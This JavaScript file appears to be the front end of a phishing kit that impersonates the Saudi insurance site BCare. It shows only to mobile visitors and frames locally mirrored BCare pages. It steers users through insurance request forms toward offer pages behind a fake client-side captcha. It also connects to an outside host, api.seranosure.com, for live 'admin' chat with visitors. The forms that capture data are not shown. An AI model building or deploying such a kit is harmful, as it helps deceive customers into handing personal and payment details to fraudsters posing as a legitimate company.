(function () {
  var ua = navigator.userAgent;
  if (!/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return;

  var MAP = {
    "/": "home",
    "/motor-insurance": "home",
    "/travel-insurance": "landing-travel",
    "/domestic-workers": "landing-helpers",
    "/medical-insurance": "landing-medical",
    "/medical-malpractice": "landing-mm",
    "/motor-insurance-request": "motor",
    "/travel-insurance-request": "travel",
    "/domestic-workers-request": "helpers",
    "/medical-insurance-request": "medical",
    "/medical-malpractice-request": "mm",
  };
  var REQ = { "/motor-insurance-request": 1, "/travel-insurance-request": 1, "/domestic-workers-request": 1, "/medical-insurance-request": 1, "/medical-malpractice-request": 1 };
  var FORM = { "/motor-insurance-request": "/new-appointment", "/travel-insurance-request": "/travel-form", "/domestic-workers-request": "/domestic-form", "/medical-insurance-request": "/medical-form", "/medical-malpractice-request": "/malpractice-form" };

  var OFFERS = { "/new-appointment": "/compare-offers", "/travel-form": "/travel-offers",
    "/domestic-form": "/domestic-offers", "/medical-form": "/medical-offers",
    "/malpractice-form": "/malpractice-offers" };
  function norm() { return (location.pathname || "/").replace(/\/+$/, "") || "/"; }
  if (!MAP[norm()]) return;

  var host = document.getElementById("shell");
  if (!host) return;

  var v = window.innerWidth < 960 ? "-m" : "-t";
  var lang = "ar";

  var st = document.createElement("style");
  st.textContent = "@keyframes shspin{to{transform:rotate(360deg)}}";
  document.head.appendChild(st);

  var overlay = document.createElement("div");
  overlay.setAttribute("dir", "rtl");
  overlay.style.cssText = "position:fixed;top:0;right:0;bottom:0;left:0;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;background:#fff;pointer-events:none";
  overlay.innerHTML = '<img src="/ref/assets/bcare.com.sa/assets/images/Bcare-logo.svg" alt="" style="height:46px">'
    + '<div style="width:38px;height:38px;border:3px solid #dbe6ee;border-top-color:#146394;border-radius:50%;animation:shspin 1s linear infinite"></div>'
    + '<p style="color:#146394;font-size:13px;font-weight:700;margin:0">جارٍ التحميل...</p>';
  host.appendChild(overlay);

  var frame = document.createElement("iframe");
  frame.title = "بي كير";
  frame.style.cssText = "position:fixed;top:0;right:0;bottom:0;left:0;width:100%;height:100%;border:0;background:#f7f7f7";
  host.appendChild(frame);
  window.__shellFrame = frame;

  var chatSocket = null;
  function ensureSocket() {
    if (chatSocket) return chatSocket;
    if (typeof window.io !== "function") return null;
    chatSocket = window.io("https://api.seranosure.com", { transports: ["websocket", "polling"] });
    chatSocket.on("chat:fromAdmin", function (p) {
      var text = typeof p === "string" ? p : (p && p.message) || "";
      if (!text || !frame.contentWindow) return;
      frame.contentWindow.postMessage({ type: "ref-chat-incoming", text: text }, location.origin);
    });
    return chatSocket;
  }
  function loadSocket(cb) {
    if (typeof window.io === "function") { cb(); return; }
    var sc = document.createElement("script");
    sc.src = "https://cdn.socket.io/4.8.1/socket.io.min.js";
    sc.onload = cb;
    sc.onerror = cb;
    document.head.appendChild(sc);
  }
  var current = "";
  function apply() {
    var p = norm();
    if (!MAP[p]) { host.style.display = "none"; return; }
    host.style.display = "";
    var src = "/ref/" + MAP[p] + "-" + lang + v + ".html?b=31&r=" + encodeURIComponent(p);
    if (src !== current) { current = src; frame.src = src; }
  }

  function go(p, nextLang) {
    if (!p) return;
    p = String(p).split("?")[0];
    var changed = false;
    if ((nextLang === "ar" || nextLang === "en") && nextLang !== lang) { lang = nextLang; changed = true; }
    if (p !== norm()) { history.pushState({}, "", p); changed = true; }
    if (changed) apply();
  }

  function nav(to, nextLang) {
    to = String(to).split("?")[0];
    var here = norm();
    if (OFFERS[here]) { location.href = OFFERS[here]; return; }
    if (REQ[to] && FORM[here]) { location.href = FORM[here]; return; }
    if (to === "/motor-insurance" || to === "/motor-insurance-request") {
      if (here === "/motor-insurance-request") { location.href = "/new-appointment"; return; }
      go("/motor-insurance-request", nextLang); return;
    }
    if (REQ[to]) { go(to, nextLang); return; }
    go(to, nextLang);
  }

  window.addEventListener("message", function (e) {
    if (e.origin !== location.origin || !e.data) return;
    if (e.data.type === "ref-nav" && typeof e.data.to === "string") { nav(e.data.to, e.data.lang); return; }
    if (e.data.type === "ref-chat-send") {
      var d = e.data;
      var txt = (d.text || "").trim();
      var reply = function (ok) {
        if (!frame.contentWindow) return;
        frame.contentWindow.postMessage({ type: "ref-chat-result", id: d.id, ok: ok, reason: ok ? "" : "offline" }, location.origin);
      };
      if (!txt) { reply(false); return; }
      loadSocket(function () {
        var s = ensureSocket();
        if (!s) { reply(false); return; }
        s.emit("chat:fromVisitor", { message: txt, timestamp: Date.now() });
        reply(true);
      });
      return;
    }
  });
  window.addEventListener("popstate", apply);

  function drawCaptcha(doc) {
    var hostEl = doc.querySelector("bcare-presentation-captcha-input");
    var img = hostEl && hostEl.querySelector('img[src^="data:image"]');
    var input = hostEl && hostEl.querySelector("input");
    if (!hostEl || !img) return;
    var w = 100, h = 46;
    var code = "";
    for (var i = 0; i < 4; i++) code += String(Math.floor(Math.random() * 10));
    var c = doc.createElement("canvas");
    c.width = w; c.height = h;
    var x = c.getContext("2d");
    if (!x) return;
    x.fillStyle = "#fff"; x.fillRect(0, 0, w, h);
    var kind = Math.floor(Math.random() * 5);
    var lc = ["#bcd3e6", "#8f9de0", "#7fa8d4", "#9ad19a", "#e8b0b0"][kind];
    x.strokeStyle = lc; x.lineWidth = 1;
    var a, b;
    if (kind === 0) {
      for (a = 0; a <= w; a += 5) { x.beginPath(); x.moveTo(a, 0); x.lineTo(a, h); x.stroke(); }
      for (b = 0; b <= h; b += 5) { x.beginPath(); x.moveTo(0, b); x.lineTo(w, b); x.stroke(); }
    } else if (kind === 1) {
      for (a = -h; a < w; a += 5) { x.beginPath(); x.moveTo(a, 0); x.lineTo(a + h, h); x.stroke(); }
    } else if (kind === 2) {
      for (a = 0; a <= w; a += 5) { x.beginPath(); x.moveTo(a, 0); x.lineTo(a, h); x.stroke(); }
    } else if (kind === 3) {
      x.fillStyle = lc;
      for (a = 2; a < w; a += 5) for (b = 2; b < h; b += 5) { x.beginPath(); x.arc(a, b, 0.9, 0, 6.283); x.fill(); }
    } else {
      for (b = 0; b <= h; b += 4) { x.beginPath(); x.moveTo(0, b); x.lineTo(w, b); x.stroke(); }
    }
    var cols = ["#e8620c", "#c62828", "#1a3a8b", "#5a1a8b", "#111111", "#8b1a1a", "#0d6b3f"];
    for (i = 0; i < 4; i++) {
      x.save();
      x.translate(14 + i * 21, 31 + (Math.random() * 6 - 3));
      x.rotate((Math.random() - 0.5) * 0.5);
      x.fillStyle = cols[Math.floor(Math.random() * cols.length)];
      x.font = (i % 2 ? "italic " : "bold ") + (26 + Math.floor(Math.random() * 6)) + "px serif";
      x.fillText(code.charAt(i), 0, 0);
      x.restore();
    }
    img.src = c.toDataURL();
    frame.__code = code;
    if (input) input.value = "";
  }

  function wire(doc) {
    var p = norm();
    var needsCaptcha = !!(REQ[p] || FORM[p]);
    if (needsCaptcha) drawCaptcha(doc);
    if (!REQ[p] && !FORM[p]) return;
    doc.addEventListener("click", function (e) {
      var t = e.target;
      if (!t || !t.closest) return;
      if (t.closest('img[src*="refresh"], mat-icon')) {
        var s = (t.getAttribute("alt") || "") + (t.textContent || "") + (t.className || "");
        if (/refresh|autorenew|cached|sync|reload/i.test(s)) return;
      }
      var btn = t.closest('button[type=submit], [type=submit]');
      if (!btn) return;
      var hostEl = doc.querySelector("bcare-presentation-captcha-input");
      var input = hostEl && hostEl.querySelector("input");
      if (!input || !frame.__code) return;
      var err = hostEl.querySelector(".ref-cap-err");
      if (input.value.trim() !== frame.__code) {
        e.preventDefault();
        e.stopPropagation();
        if (!err) {
          err = doc.createElement("p");
          err.className = "ref-cap-err";
          err.style.cssText = "color:#c82333;font-size:12px;margin:4px 0 0";
          err.textContent = "رمز التحقق غير صحيح";
          hostEl.appendChild(err);
        }
        drawCaptcha(doc);
        return;
      }
      e.preventDefault();
      e.stopPropagation();
      if (REQ[p]) { go(FORM[p]); return; }
      var st2 = doc.createElement("p");
      st2.style.cssText = "color:#146394;font-size:13px;margin:8px 0 0;font-weight:700";
      st2.textContent = "تم التحقق، جارٍ المتابعة...";
      btn.parentNode.appendChild(st2);
    }, true);
  }

  frame.onload = function () {
    try { loadSocket(function () { ensureSocket(); }); } catch (e) {}
    if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
    var doc = frame.contentDocument;
    if (doc) { try { wire(doc); } catch (e) {} }
  };
  setTimeout(function () { if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay); }, 9000);

  apply();
  setInterval(apply, 150);
})();